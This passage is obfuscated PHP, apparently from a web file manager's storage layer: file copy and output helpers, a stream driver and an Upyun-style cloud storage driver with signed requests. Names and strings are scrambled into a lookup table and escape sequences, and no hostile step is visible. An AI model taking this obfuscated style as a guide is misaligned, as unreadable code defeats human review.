copyMoveKeepInfo($øàºñÄÂ, $Ö††Ø·û, $á§å’ƒ) { if (!$á§å’ƒ) { return; } $Ñãò‘¿¯ = $øàºñÄÂ->info($Ö††Ø·û); if (!is_array($Ñãò‘¿¯)) { return; } IO::setModifyTime($á§å’ƒ, $Ñãò‘¿¯[$_SERVER[º·Ï‹¥³][88]]); } public static function pathFather($Ú•ğºçÌ) { $Á²ÅÆÆµ = IO::init($Ú•ğºçÌ); $ÑÄÑÏ¦ = $Á²ÅÆÆµ->pathFather($Á²ÅÆÆµ->path); return $Á²ÅÆÆµ->getPathOuter($ÑÄÑÏ¦); } public static function fileOut($°Ê‡ß·, $‚Û³üŠ = false, $Ñ³ŸÒ©¥ = false, $Ûƒ·æœµ = '') { $©ÛßÛ = self::driverMake($°Ê‡ß·); if ($©ÛßÛ->isFileOutServer()) { return $©ÛßÛ->fileOutServer($°Ê‡ß·, $‚Û³üŠ, $Ñ³ŸÒ©¥, $Ûƒ·æœµ); } return $©ÛßÛ->fileOut($°Ê‡ß·, $‚Û³üŠ, $Ñ³ŸÒ©¥, $Ûƒ·æœµ); } public static function fileOutImage($¦Ñ˜ßÃç, $©¹şû€ = 250) { $œ£×¸à = array(250, 600, 1200, 2000, 3000, 5000); for ($­©˜Ò›Ö = 0; $­©˜Ò›Ö < count($œ£×¸à); $­©˜Ò›Ö++) { if ($­©˜Ò›Ö == 0 && $©¹şû€ <= $œ£×¸à[$­©˜Ò›Ö]) { $©¹şû€ = $œ£×¸à[$­©˜Ò›Ö]; break; } else { if ($©¹şû€ > $œ£×¸à[$­©˜Ò›Ö - 1] && $©¹şû€ <= $œ£×¸à[$­©˜Ò›Ö]) { $©¹şû€ = $œ£×¸à[$­©˜Ò›Ö]; break; } else { if ($­©˜Ò›Ö == count($œ£×¸à) - 1 && $©¹şû€ > $œ£×¸à[$­©˜Ò›Ö]) { $©¹şû€ = $œ£×¸à[$­©˜Ò›Ö]; break; } } } } $ŞĞßèˆ = self::driverMake($¦Ñ˜ßÃç); if ($ŞĞßèˆ->isFileOutServer()) { return $ŞĞßèˆ->fileOutImageServer($¦Ñ˜ßÃç, $©¹şû€); } return $ŞĞßèˆ->fileOutImage($¦Ñ˜ßÃç, $©¹şû€); } private static function driverIsSame($Âøšâ€ , $Šµ­ö‹ê) { $ƒ¼ı•¨û =& $_SERVER[º·Ï‹¥³]; $îáÆì†˜ = $Âøšâ€ ->getType(); $óåÄËë‹ = $Šµ­ö‹ê->getType(); if ($îáÆì†˜ != $óåÄËë‹) { return !1; } if ($îáÆì†˜ == $ƒ¼ı•¨û[809]) { return !0; } if ($îáÆì†˜ == $ƒ¼ı•¨û[109]) { return !0; } if ($Âøšâ€ ->pathDriver == $Šµ­ö‹ê->pathDriver) { return !0; } return !1; } public static function copyUpdate($‰à¡–ş«, $¢òíøû) { $êëËˆ“… =& $_SERVER[º·Ï‹¥³]; if (!IO::exist($‰à¡–ş«)) { return !1; } if (!IO::exist($¢òíøû)) { IO::mkdir($¢òíøû); } $³‘¨×îò = array_to_keyvalue(self::listAllSimple($‰à¡–ş«), $êëËˆ“…[87]); $…¿Àº” = array_to_keyvalue(self::listAllSimple($¢òíøû), $êëËˆ“…[87]); $¯â®×Ï¹ = array(); $“œ‹¨Øá = array(); foreach ($³‘¨×îò as $ÏÓˆ¤¾Á => $§ĞÊÔæ›) { if (isset($…¿Àº”[$ÏÓˆ¤¾Á])) { if ($§ĞÊÔæ›[$êëËˆ“…[78]] == 1) { continue; } if ($…¿Àº”[$ÏÓˆ¤¾Á][$êëËˆ“…[79]] == $§ĞÊÔæ›[$êëËˆ“…[79]]) { continue; } } if ($§ĞÊÔæ›[$êëËˆ“…[78]] == 1) { $“œ‹¨Øá[] = $¢òíøû . $êëËˆ“…[8] . trim($ÏÓˆ¤¾Á, $êëËˆ“…[8]); continue; } $…ÏÂşó˜ = strstr(trim($ÏÓˆ¤¾Á, $êëËˆ“…[8]), $êëËˆ“…[8]) ? get_path_father($ÏÓˆ¤¾Á) : $êëËˆ“…[12]; $¯â®×Ï¹[] = array($êëËˆ“…[1212] => $§ĞÊÔæ›[$êëËˆ“…[89]], $êëËˆ“…[1213] => rtrim($¢òíøû, $êëËˆ“…[8]) . $êëËˆ“…[8] . $…ÏÂşó˜, $êëËˆ“…[1214] => $§ĞÊÔæ›); } $Ãñ××öŠ = array($êëËˆ“…[221] => $¯â®×Ï¹, $êëËˆ“…[78] => $“œ‹¨Øá); Hook::trigger($êëËˆ“…[1215], $‰à¡–ş«, $¢òíøû, $Ãñ××öŠ); foreach ($“œ‹¨Øá as $§ĞÊÔæ›) { IO::mkdir($§ĞÊÔæ›); } foreach ($¯â®×Ï¹ as $§ĞÊÔæ›) { IO::copy($§ĞÊÔæ›[$êëËˆ“…[1212]], $§ĞÊÔæ›[$êëËˆ“…[1213]], REPEAT_REPLACE); } } public static function fileSubstr($±ÄŸ½Ò, $çÙ¢ã€‘, $’Æ‹óÒ‚ = false) { $‰Ÿã‚ =& $_SERVER[º·Ï‹¥³]; $šÓ¡­¢½ = self::driverMake($±ÄŸ½Ò); $’ î¡§ = $šÓ¡­¢½->size($±ÄŸ½Ò); $ƒÄøÒµ¨ = $çÙ¢ã€‘; $Ş‘œ½©¶ = $’Æ‹óÒ‚; if ($çÙ¢ã€‘ < 0) { $çÙ¢ã€‘ = $’ î¡§ + $çÙ¢ã€‘; } if ($’Æ‹óÒ‚ === !1) { $’Æ‹óÒ‚ = $’ î¡§ - $çÙ¢ã€‘; } if ($çÙ¢ã€‘ + $’Æ‹óÒ‚ > $’ î¡§) { $’Æ‹óÒ‚ = $’ î¡§ - $çÙ¢ã€‘; } if (!$’ î¡§ && $šÓ¡­¢½->getType() == $‰Ÿã‚[109] && !$šÓ¡­¢½->exist($±ÄŸ½Ò)) { $ƒ–¸Ö‘ = get_path_this($±ÄŸ½Ò); $ËÄ¾”¦ = parse_url_query($ƒ–¸Ö‘); if (is_array($ËÄ¾”¦) && isset($ËÄ¾”¦[$‰Ÿã‚[32]])) { $ƒ–¸Ö‘ = urldecode($ËÄ¾”¦[$‰Ÿã‚[32]]); } throw new Exception($‰Ÿã‚[1216] . LNG($‰Ÿã‚[1217]) . $‰Ÿã‚[1015] . clear_html($ƒ–¸Ö‘) . $‰Ÿã‚[12]); } if ($’Æ‹óÒ‚ <= 0) { return $‰Ÿã‚[12]; } if ($çÙ¢ã€‘ < 0 || $çÙ¢ã€‘ >= $’ î¡§ || $’Æ‹óÒ‚ > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\x65\122\145\x61\144\40\x65\x72\162\157\x72\x21\x20\163\x74\141\162\x74\75{$çÙ¢ã€‘}\x3b\x6c\145\x6e\x67\x74\x68\75{$’Æ‹óÒ‚}\73\x20\x73\x69\172\x65\x3d{$’ î¡§}\x3b"); } $¹Œ›óÀÆ = $šÓ¡­¢½->fileSubstr($±ÄŸ½Ò, $çÙ¢ã€‘, $’Æ‹óÒ‚); if (!$¹Œ›óÀÆ && $’Æ‹óÒ‚ && isset($GLOBALS[$‰Ÿã‚[1218]])) { throw new Exception($GLOBALS[$‰Ÿã‚[1218]][$‰Ÿã‚[1219]]); } return $¹Œ›óÀÆ; } private static function driverMake(&$ÁÅÓ¼•) { $·ˆÓ =& $_SERVER[º·Ï‹¥³]; $¢±‰¤ÚÅ = KodIO::parse($ÁÅÓ¼•); if (!self::$driverListSystem) { $Èş¡ºÃ‚ = Model($·ˆÓ[819])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Èş¡ºÃ‚, $·ˆÓ[459]); } if ($¢±‰¤ÚÅ[$·ˆÓ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$¢±‰¤ÚÅ[$·ˆÓ[459]]]) { throw new Exception($·ˆÓ[1220]); return !1; } $ÁÅÓ¼• = $¢±‰¤ÚÅ[$·ˆÓ[1221]]; $Ì³ì‹”€ = self::driverGet($¢±‰¤ÚÅ, $ÁÅÓ¼•); return $Ì³ì‹”€; } private static function driverGet($çéÎ¥¡€, &$›õŸ´¤) { $å’÷› =& $_SERVER[º·Ï‹¥³]; $€¿Óûş‘ = $çéÎ¥¡€[$å’÷›[1222]]; $á†À°€® = $çéÎ¥¡€[$å’÷›[459]]; switch ($çéÎ¥¡€[$å’÷›[33]]) { case KodIO::KOD_IO: $Ô¼»å¼ş = self::$driverListSystem[$á†À°€®]; break; case KodIO::KOD_SOURCE: $›õŸ´¤ = $á†À°€® . $›õŸ´¤; $Ô¼»å¼ş = array($å’÷›[1223] => $å’÷›[1224], $å’÷›[6] => $çéÎ¥¡€); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $üĞûú‡º = $GLOBALS[$å’÷›[1225]]; self::$driverListUser = array_to_keyvalue($üĞûú‡º, $å’÷›[459]); } $Ô¼»å¼ş = self::$driverListUser[$á†À°€®]; break; case KodIO::KOD_SHARE_LINK: $Ô¼»å¼ş = array($å’÷›[1223] => $å’÷›[1226], $å’÷›[6] => $çéÎ¥¡€); $ôÆ€¯„å = Action($å’÷›[1227])->sharePathInfo($çéÎ¥¡€[$å’÷›[87]]); $›õŸ´¤ = $ôÆ€¯„å[$å’÷›[184]]; if (!$ôÆ€¯„å[$å’÷›[184]]) { $À¬şêè¿ = Model($å’÷›[648])->getInfo($ôÆ€¯„å[$å’÷›[649]]); $›õŸ´¤ = KodIO::clear($À¬şêè¿[$å’÷›[1228]] . $çéÎ¥¡€[$å’÷›[1221]]); $çéÎ¥¡€[$å’÷›[545]] = $À¬şêè¿; $çéÎ¥¡€[$å’÷›[1203]] = $›õŸ´¤; $Ô¼»å¼ş = array($å’÷›[1223] => $å’÷›[1229], $å’÷›[6] => $çéÎ¥¡€); } break; case KodIO::KOD_SHARE_ITEM: $Ô¼»å¼ş = array($å’÷›[1223] => $å’÷›[1230], $å’÷›[6] => $çéÎ¥¡€); $À¬şêè¿ = Model($å’÷›[648])->getInfo($çéÎ¥¡€[$å’÷›[459]]); if ($À¬şêè¿[$å’÷›[184]] == $å’÷›[219]) { $›õŸ´¤ = KodIO::clear($À¬şêè¿[$å’÷›[1228]] . $çéÎ¥¡€[$å’÷›[1221]]); $çéÎ¥¡€[$å’÷›[545]] = $À¬şêè¿; $çéÎ¥¡€[$å’÷›[1203]] = $›õŸ´¤; $Ô¼»å¼ş = array($å’÷›[1223] => $å’÷›[1231], $å’÷›[6] => $çéÎ¥¡€); } else { if (!$›õŸ´¤) { $›õŸ´¤ = $À¬şêè¿[$å’÷›[184]]; } } break; default: $›õŸ´¤ = $çéÎ¥¡€[$å’÷›[87]]; $Ô¼»å¼ş = array($å’÷›[1223] => $å’÷›[1232]); break; } $§Âø¯êÛ = $çéÎ¥¡€[$å’÷›[87]]; if (!isset(self::$driverCache[$§Âø¯êÛ])) { $§Ãğ³Â¯ = strtolower($Ô¼»å¼ş[$å’÷›[98]]); $ªîù· = $GLOBALS[$å’÷›[6]][$å’÷›[92]][$å’÷›[877]]; $ëÀ§Š’¬ = $å’÷›[77] . (isset($ªîù·[$§Ãğ³Â¯]) ? $ªîù·[$§Ãğ³Â¯] : ucfirst($§Ãğ³Â¯)); if (!class_exists($ëÀ§Š’¬)) { show_json("{$ëÀ§Š’¬}\x20\156\157\164\x20\145\x78\x69\x73\x74\163\41", !1); } $©¹½îØ = isset($Ô¼»å¼ş[$å’÷›[6]]) ? $Ô¼»å¼ş[$å’÷›[6]] : !1; self::$driverCache[$§Âø¯êÛ] = new $ëÀ§Š’¬($©¹½îØ); } $„‘ùîĞ¬ = self::$driverCache[$§Âø¯êÛ]; $„‘ùîĞ¬->pathDriver = $€¿Óûş‘; $„‘ùîĞ¬->pathBase = $å’÷›[12]; if (isset($Ô¼»å¼ş[$å’÷›[6]][$å’÷›[1233]])) { $„‘ùîĞ¬->pathBase = rtrim($Ô¼»å¼ş[$å’÷›[6]][$å’÷›[1233]], $å’÷›[8]) . $å’÷›[8]; $›õŸ´¤ = $„‘ùîĞ¬->pathBase . ltrim($›õŸ´¤, $å’÷›[8]); } $›õŸ´¤ = $„‘ùîĞ¬->getPath($›õŸ´¤); if (isset($çéÎ¥¡€[$å’÷›[1203]])) { $›õŸ´¤ = $çéÎ¥¡€[$å’÷›[1203]]; } $„‘ùîĞ¬->path = $›õŸ´¤; return $„‘ùîĞ¬; } public static function errorTips($Ã¡…è¥ı = false) { $¥·‹û£¹ =& $_SERVER[º·Ï‹¥³]; static $‡òèúºƒ = array(); $ìÊ»ü×â = 1000; if ($Ã¡…è¥ı === -1) { return $‡òèúºƒ ? $‡òèúºƒ[count($‡òèúºƒ) - 1] : $¥·‹û£¹[12]; } if ($Ã¡…è¥ı === !1) { return implode($¥·‹û£¹[253], $‡òèúºƒ); } if (count($‡òèúºƒ) >= $ìÊ»ü×â) { $‡òèúºƒ = array_slice($‡òèúºƒ, $ìÊ»ü×â * 0.5, $ìÊ»ü×â); } $‡òèúºƒ[] = $Ã¡…è¥ı; write_log($¥·‹û£¹[166] . ACTION . $¥·‹û£¹[1234] . $Ã¡…è¥ı, $¥·‹û£¹[1235]); } public static function getLastError($…á½Ú–« = '') { $õíÓû¥ = self::errorTips(-1); return $õíÓû¥ ? $õíÓû¥ : $…á½Ú–«; } } goto d—À‡Õ¬İ; DƒÌ¹Ôˆ’­: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($öˆì£»¬, $‘‘€ìÎ = 0) { parent::__construct(); $this->source = $öˆì£»¬; $this->sourceSize = $‘‘€ìÎ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($”Ú–“±Ç = false) { return $this->sourceSize; } public function getContent($ã®¾”ü  = false) { return $this->fileSubstr($ã®¾”ü , 0, $this->sourceSize); } public function fileSubstr($±óÇ½½î = false, $‹¸õŒÊÜ = 0, $ŸñÅãÄà = 0) { if (!$ŸñÅãÄà) { $ŸñÅãÄà = $this->sourceSize; } $’‚¥ûÊæ = $this->sourceSize - $‹¸õŒÊÜ; if ($ŸñÅãÄà >= $’‚¥ûÊæ) { $ŸñÅãÄà = $’‚¥ûÊæ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $‹¸õŒÊÜ, $ŸñÅãÄà); } if ($this->sourceType == self::TYPE_FILE) { if ($ŸñÅãÄà <= 0) { return $_SERVER[º·Ï‹¥³][12]; } $«İœÊã = ftell($this->source); fseek_64($this->source, $«İœÊã + $‹¸õŒÊÜ); $ôÂ°¦Óä = @fread($this->source, $ŸñÅãÄà); fseek_64($this->source, $«İœÊã); return $ôÂ°¦Óä; } } public function hashMd5($ºø¡Ÿî = false) { return md5($this->getContent()); } public static function hash($ôøì…Û´, $ÊÃ»ıˆ¿ = 0) { $æÂ§»¢‘ = new PathDriverStream($ôøì…Û´, $ÊÃ»ıˆ¿); return $æÂ§»¢‘->hashSimple($ôøì…Û´); } public static function md5($ç”€éê, $Ç°„İ¨½ = 0) { $—¦øªĞ = new PathDriverStream($ç”€éê, $Ç°„İ¨½); return $—¦øªĞ->hashMd5($ç”€éê); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\72\57\57\x76\60\x2e\141\160\x69\x2e\165\x70\171\x75\156\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($İÄÂ÷öÎ) { parent::__construct(); $this->_init($İÄÂ÷öÎ); } public function _init($²Â©ä”ß) { $ÚÇ½ã©¥ =& $_SERVER[º·Ï‹¥³]; foreach ($²Â©ä”ß as $¶œğ¾óÓ => $ÂÒŒŸÆı) { if (isset($this->{$¶œğ¾óÓ})) { $this->{$¶œğ¾óÓ} = $ÂÒŒŸÆı; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ÚÇ½ã©¥[1529] . LNG($ÚÇ½ã©¥[1433])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¸„ä‹¸Ü, $„º¦¬í¬ = "\107\105\x54") { $«‹¸öÎ¼ =& $_SERVER[º·Ï‹¥³]; $—¿½¦Œ‹ = gmdate($«‹¸öÎ¼[1466]); $çœ ×Ìó = base64_encode(hash_hmac($«‹¸öÎ¼[1530], "{$„º¦¬í¬}\x26{$¸„ä‹¸Ü}\x26{$—¿½¦Œ‹}", md5("{$this->userpass}"), !0)); $×‰Úì–™ = array("\x41\x75\x74\150\157\x72\x69\x7a\141\x74\151\157\x6e\x3a\x55\120\x59\125\116\x20{$this->username}\72{$çœ ×Ìó}", "\x44\141\164\x65\x3a{$—¿½¦Œ‹}"); return $×‰Úì–™; } public function ussRequest($¯ï¦à·‡, $Ô³Š½Çê = "\x47\x45\124", $» îû• = false, $ä¾­ëÂ£ = false, $–¿ºßµª = false) { $äÀê­ô™ =& $_SERVER[º·Ï‹¥³]; $¯ï¦à·‡ = trim($¯ï¦à·‡, $äÀê­ô™[8]); $˜÷ìÂÊµ = "\x2f{$this->bucket}\x2f{$¯ï¦à·‡}"; $õæèÃªî = $this->ussHeaders($˜÷ìÂÊµ, $Ô³Š½Çê); if ($ä¾­ëÂ£) { $õæèÃªî = array_merge($õæèÃªî, $ä¾­ëÂ£); } $ñ±ÏıÌó = url_request($this->endpoint . $˜÷ìÂÊµ, $Ô³Š½Çê, $» îû•, $õæèÃªî, $–¿ºßµª); if (!$ñ±ÏıÌó) { $¡ÇÚñÈ = LNG($äÀê­ô™[1531]); $this->writeLog($¡ÇÚñÈ); return array($äÀê­ô™[1265] => !1, $äÀê­ô™[1255] => $¡ÇÚñÈ); } if (strtolower($Ô³Š½Çê) == $äÀê­ô™[218] || in_array($ñ±ÏıÌó[$äÀê­ô™[1265]], array($äÀê­ô™[265], $äÀê­ô™[1532]))) { $» îû• = $ñ±ÏıÌó[$äÀê­ô™[1533]]; } else { $» îû• = json_decode($ñ±ÏıÌó[$äÀê­ô™[1255]], !0); if (!$» îû•) { $» îû• = $ñ±ÏıÌó[$äÀê­ô™[1255]]; } else { if (!$ñ±ÏıÌó[$äÀê­ô™[802]] && isset($» îû•[$äÀê­ô™[1534]])) { $» îû• = $» îû•[$äÀê­ô™[1534]]; } } } if (!$ñ±ÏıÌó[$äÀê­ô™[802]]) { $this->writeLog($this->__errorMessage($» îû•)); } return array($äÀê­ô™[1265] => $ñ±ÏıÌó[$äÀê­ô™[802]], $äÀê­ô™[1255] => $» îû•); } private function __errorMessage($Î‹¾èºÃ) { $¸­ÕÙİ· =& $_SERVER[º·Ï‹¥³]; if (!$Î‹¾èºÃ) { return $¸­ÕÙİ·[12]; } static $ÏÕÍÌ’ó = null; if (!$ÏÕÍÌ’ó) { $ÏÕÍÌ’ó = I18n::getType(); } if ($ÏÕÍÌ’ó != $¸­ÕÙİ·[1476]) { return $Î‹¾èºÃ; } $Ïªº«¥ = array($¸­ÕÙİ·[1535] => $¸­ÕÙİ·[1536], $¸­ÕÙİ·[1537] => $¸­ÕÙİ·[1538], $¸­ÕÙİ·[1539] => $¸­ÕÙİ·[1538], $¸­ÕÙİ·[1540] => $¸­ÕÙİ·[1541], $¸­ÕÙİ·[1542] => $¸­ÕÙİ·[1543], $¸­ÕÙİ·[1544] => $¸­ÕÙİ·[1545], $¸­ÕÙİ·[1546] => $¸­ÕÙİ·[1547]); return isset($Ïªº«¥[$Î‹¾èºÃ]) ? $Ïªº«¥[$Î‹¾èºÃ] : $Î‹¾èºÃ; } public function mkfile($æ¨ï«ûš, $ƒƒ©²ıë = '', $Å—©‰‰è = REPEAT_RENAME) { if ($this->setContent($æ¨ï«ûš, $ƒƒ©²ıë)) { return $this->getPathOuter($æ¨ï«ûš); } return !1; } public function mkdir($ØÒ„Ÿ•, $¼±©êè› = REPEAT_SKIP) { $íèâ«Êç =& $_SERVER[º·Ï‹¥³]; $èÉåëÊØ = trim($ØÒ„Ÿ•, $íèâ«Êç[8]); if ($this->_isFolder($èÉåëÊØ)) { return $this->getPathOuter($èÉåëÊØ); } $ÚÎ·©†È = array($íèâ«Êç[1548]); $¼«–Ï¢Ã = $this->ussRequest($èÉåëÊØ, $íèâ«Êç[248], !1, $ÚÎ·©†È); return $¼«–Ï¢Ã[$íèâ«Êç[1265]] ? $this->getPathOuter($èÉåëÊØ) : !1; } public function copyFile($ëÚåÕ¡“, $É‹‹¦âå) { $ô±ç¢²Ê =& $_SERVER[º·Ï‹¥³]; $¨¥ºŒÙå = array($ô±ç¢²Ê[1549] . "\x2f{$this->bucket}\57{$ëÚåÕ¡“}", $ô±ç¢²Ê[1550]); $÷»˜ÓÏ‘ = $this->ussRequest($É‹‹¦âå, $ô±ç¢²Ê[250], !1, $¨¥ºŒÙå); return $÷»˜ÓÏ‘[$ô±ç¢²Ê[1265]] ? !0 : $this->getPathOuter($É‹‹¦âå); } public function moveFile($ˆƒç½…¢, $§èÏ’¶ë) { $¬œğÑÏı =& $_SERVER[º·Ï‹¥³]; $­Â«¶¦ = array($¬œğÑÏı[1551] . "\57{$this->bucket}\57{$ˆƒç½…¢}", $¬œğÑÏı[1550]); $Âë¹ï = $this->ussRequest($§èÏ’¶ë, $¬œğÑÏı[250], !1, $­Â«¶¦); return $Âë¹ï[$¬œğÑÏı[1265]] ? !0 : $this->getPathOuter($§èÏ’¶ë); } public function delFile($ƒğş Ö) { $ûÒ»±ÇÎ =& $_SERVER[º·Ï‹¥³]; $á²Ñ«ğ­ = $this->ussRequest($ƒğş Ö, $ûÒ»±ÇÎ[1552]); return $á²Ñ«ğ­[$ûÒ»±ÇÎ[1265]] ? !0 : !1; } public function delFolder($ù†¨×´) { $‰¾şš“³ =& $_SERVER[º·Ï‹¥³]; if (!$this->exist($ù†¨×´)) { return !0; } $this->listItemCache = !1; $³¿¡æÍ = $«Æ¶ÂÕü = array(); $this->fileList($ù†¨×´, $³¿¡æÍ, $«Æ¶ÂÕü, !0); $this->listItemCache = !0; foreach ($«Æ¶ÂÕü as $îÑß“„û) { $³“ªıè° = $this->ussRequest($îÑß“„û[$‰¾şš“³[32]], $‰¾şš“³[1552]); if (!$³“ªıè°[$‰¾şš“³[1265]]) { return !1; } } foreach ($³¿¡æÍ as $¤ÆÕ‡§) { $³“ªıè° = $this->ussRequest($¤ÆÕ‡§, $‰¾şš“³[1552]); if (!$³“ªıè°[$‰¾şš“³[1265]]) { return !1; } } $³“ªıè° = $this->ussRequest($ù†¨×´, $‰¾şš“³[1552]); return $³“ªıè°[$‰¾şš“³[1265]]; } public function rename($æ¦İ™, $ÚßÑşœ) { if ($this->isFile($æ¦İ™)) { $ÚßÑşœ = get_path_father($æ¦İ™) . $ÚßÑşœ; return $this->moveFile($æ¦İ™, $ÚßÑşœ); } return $this->renameObject($æ¦İ™, $ÚßÑşœ); } public function fileInfo($£Ã†Úó, $¶ªò¿Ù = false, $ò¬˜Öãò = array()) { $êß™¿ =& $_SERVER[º·Ï‹¥³]; $‡»ğØ½ô = array($êß™¿[32] => $this->pathThis($£Ã†Úó), $êß™¿[87] => $this->getPathOuter($êß™¿[8] . $£Ã†Úó), $êß™¿[33] => $êß™¿[221], $êß™¿[79] => isset($ò¬˜Öãò[$êß™¿[79]]) ? $ò¬˜Öãò[$êß™¿[79]] : 0, $êß™¿[178] => $this->ext($£Ã†Úó)); if ($¶ªò¿Ù) { return $‡»ğØ½ô; } $‡»ğØ½ô[$êß™¿[222]] = $‡»ğØ½ô[$êß™¿[88]] = 0; $‡»ğØ½ô[$êß™¿[223]] = $‡»ğØ½ô[$êß™¿[224]] = !0; if (empty($ò¬˜Öãò)) { $ò¬˜Öãò = $this->objectMeta($£Ã†Úó); if (!$ò¬˜Öãò) { return $‡»ğØ½ô; } } $‡»ğØ½ô[$êß™¿[222]] = intval($ò¬˜Öãò[$êß™¿[1553]]); $‡»ğØ½ô[$êß™¿[88]] = intval($ò¬˜Öãò[$êß™¿[1554]]); $‡»ğØ½ô[$êß™¿[79]] = $ò¬˜Öãò[$êß™¿[79]]; return $‡»ğØ½ô; } public function folderInfo($şÀ±³ Ó, $é¤–‹µ = false) { $¹Ôá¾¦ =& $_SERVER[º·Ï‹¥³]; $‡ë…¹œ = array($¹Ôá¾¦[32] => $this->pathThis($şÀ±³ Ó), $¹Ôá¾¦[87] => $this->getPathOuter($¹Ôá¾¦[8] . $şÀ±³ Ó), $¹Ôá¾¦[33] => $¹Ôá¾¦[78]); if ($é¤–‹µ) { return $‡ë…¹œ; } $‡ë…¹œ[$¹Ôá¾¦[222]] = $‡ë…¹œ[$¹Ôá¾¦[88]] = 0; $‡ë…¹œ[$¹Ôá¾¦[223]] = $‡ë…¹œ[$¹Ôá¾¦[224]] = !0; if (empty($íØŸƒ“€)) { $íØŸƒ“€ = $this->objectMeta($şÀ±³ Ó); if (!$íØŸƒ“€) { return $‡ë…¹œ; } } $‡ë…¹œ[$¹Ôá¾¦[222]] = intval($íØŸƒ“€[$¹Ôá¾¦[1553]]); $‡ë…¹œ[$¹Ôá¾¦[88]] = intval($íØŸƒ“€[$¹Ôá¾¦[1554]]); return $‡ë…¹œ; } private function listObjs($ñÔıáÆ, $˜¦ôØÁü = 0, $ŸƒğÚÔ = 1000) { $æ¦ƒ•òî =& $_SERVER[º·Ï‹¥³]; $×´Ö»ç¤ = array($æ¦ƒ•òî[1555], $æ¦ƒ•òî[1556] . $ŸƒğÚÔ); if ($˜¦ôØÁü) { $×´Ö»ç¤[] = $æ¦ƒ•òî[1557] . $˜¦ôØÁü; } $Îñ§êö = $this->ussRequest($ñÔıáÆ, $æ¦ƒ•òî[252], !1, $×´Ö»ç¤); return !$Îñ§êö[$æ¦ƒ•òî[1265]] ? !1 : $Îñ§êö[$æ¦ƒ•òî[1255]]; } private function fileList($ì¥…“£, &$ãÆ›·ôâ, &$ØÈáˆ¶Ö, $ãÒ—™÷š = false) { $½óÄŸ»† =& $_SERVER[º·Ï‹¥³]; $©à„® = $½óÄŸ»†[12]; $ˆÚ¦±ƒ = 1000; $Ö¾í¡ü = rtrim($ì¥…“£, $½óÄŸ»†[8]) . $½óÄŸ»†[8]; while (!0) { check_abort(); $·£äîŞ­ = $this->listObjs($ì¥…“£, $©à„®, $ˆÚ¦±ƒ); if (!$·£äîŞ­) { return !1; } $©à„® = isset($·£äîŞ­[$½óÄŸ»†[1558]]) ? $·£äîŞ­[$½óÄŸ»†[1558]] : $½óÄŸ»†[12]; $Ó§ÎÏç = isset($·£äîŞ­[$½óÄŸ»†[1559]]) ? $·£äîŞ­[$½óÄŸ»†[1559]] : array(); foreach ($Ó§ÎÏç as $…Ôåã¡) { $Õ»ÅÂşî = $…Ôåã¡[$½óÄŸ»†[33]] == $½óÄŸ»†[78] ? !0 : !1; $½™áõ = ltrim($Ö¾í¡ü . $…Ôåã¡[$½óÄŸ»†[32]], $½óÄŸ»†[8]) . ($Õ»ÅÂşî ? $½óÄŸ»†[8] : $½óÄŸ»†[12]); $Äåš¶ƒÉ = array($½óÄŸ»†[32] => $½™áõ, $½óÄŸ»†[33] => $Õ»ÅÂşî ? $½óÄŸ»†[78] : $½óÄŸ»†[221], $½óÄŸ»†[79] => $…Ôåã¡[$½óÄŸ»†[388]], $½óÄŸ»†[1554] => $…Ôåã¡[$½óÄŸ»†[1560]]); $this->cacheMethodInfoSet($½™áõ, $Õ»ÅÂşî, $Äåš¶ƒÉ); if ($Õ»ÅÂşî) { $ãÆ›·ôâ[] = $½™áõ; if ($ãÒ—™÷š) { $this->fileList($½™áõ, $ãÆ›·ôâ, $ØÈáˆ¶Ö, $ãÒ—™÷š); } continue; } $ØÈáˆ¶Ö[] = $Äåš¶ƒÉ; } if (count($Ó§ÎÏç) < $ˆÚ¦±ƒ) { break; } } $this->cacheMethodInfoSet($ì¥…“£, !0); } public function listPath($ƒö›·÷, $•Ø¾õ = false) { $ò˜è‚òÌ =& $_SERVER[º·Ï‹¥³]; $†Õ×ñª = $µ¾óµÔÕ = array(); $this->fileList($ƒö›·÷, $†Õ×ñª, $µ¾óµÔÕ); foreach ($†Õ×ñª as $™ƒ²•¥ => $é«è–Öè) { $†Õ×ñª[$™ƒ²•¥] = $this->folderInfo($é«è–Öè, $•Ø¾õ); } foreach ($µ¾óµÔÕ as $™ƒ²•¥ => $é«è–Öè) { $µ¾óµÔÕ[$™ƒ²•¥] = $this->fileInfo($é«è–Öè[$ò˜è‚òÌ[32]], $•Ø¾õ, $é«è–Öè); } return array($ò˜è‚òÌ[85] => $†Õ×ñª, $ò˜è‚òÌ[86] => $µ¾óµÔÕ); } public function has($ŞüÇê¦ó, $ÕñÒåÈø = false, $¡ÌÁÖëÛ = true) { $ëáÍ¸— =& $_SERVER[º·Ï‹¥³]; $³¨±¼•ø = $ëáÍ¸—[12]; $ØÊş…ÀÌ = 500; $î¢öù  = 0; $¿¤ÚÌÙ§ = 0; $íúÈ°í• = rtrim($ŞüÇê¦ó, $ëáÍ¸—[8]) . $ëáÍ¸—[8]; while (!0) { check_abort(); $Ñ“Ş‡¥ã = $this->listObjs($ŞüÇê¦ó, $³¨±¼•ø, $ØÊş…ÀÌ); if (!$Ñ“Ş‡¥ã) { return !1; } $³¨±¼•ø = isset($Ñ“Ş‡¥ã[$ëáÍ¸—[1558]]) ? $Ñ“Ş‡¥ã[$ëáÍ¸—[1558]] : $ëáÍ¸—[12]; $€Šç§ÜÄ = isset($Ñ“Ş‡¥ã[$ëáÍ¸—[1559]]) ? $Ñ“Ş‡¥ã[$ëáÍ¸—[1559]] : array(); if (empty($€Šç§ÜÄ)) { break; } $’¦šİ«˜ = array_filter($€Šç§ÜÄ, function ($á®®°¤ä) { $îãÉ¾¨ =& 